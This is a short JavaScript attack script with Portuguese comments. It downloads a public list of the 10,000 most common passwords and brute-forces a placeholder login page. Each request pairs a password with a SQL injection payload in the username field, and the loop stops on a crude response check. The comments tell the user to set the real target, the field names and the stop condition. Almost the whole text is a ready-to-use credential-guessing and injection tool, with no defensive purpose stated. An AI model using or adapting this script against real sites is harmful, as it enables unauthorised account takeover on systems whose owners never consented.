// usar apenas uma wordlist por vez
// evitar localhost e ngrok, a idéia aqui é poupar armazenamento interno
// existem hospedagens gratuitas para subur uma wordlist

// https://gitlab.com/kalilinux/packages/routersploit/-/raw/792f589158456d04ba9a2f3216353be9c3641398/routersploit/resources/wordlists/usernames.txt

   const url = 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt';

fetch(url)
  .then(res => res.text())
  .then(text => {
    const passwords = text.split('\n').map(p => p.trim()).filter(Boolean);

    // ajustar a url do alvo antes de enviar
    const loginUrl = 'https://alvo.com/login';

    (async () => {
      for (const password of passwords) {
        console.log(`Testando: ${password}`);

        const res = await fetch(loginUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
          },
          body: `username=adimin' OR '1=1&password=${encodeURIComponent(password)}`
        }); // ajustar o user/username e pass/password aqui


        const body = await res.text();
        // ajustar filtro de parada
        if (!body.toLowerCase().includes('username')) {
          console.log(`ENCONTRADO: ${password}`);
          break;
        }
      }
    })();
  });
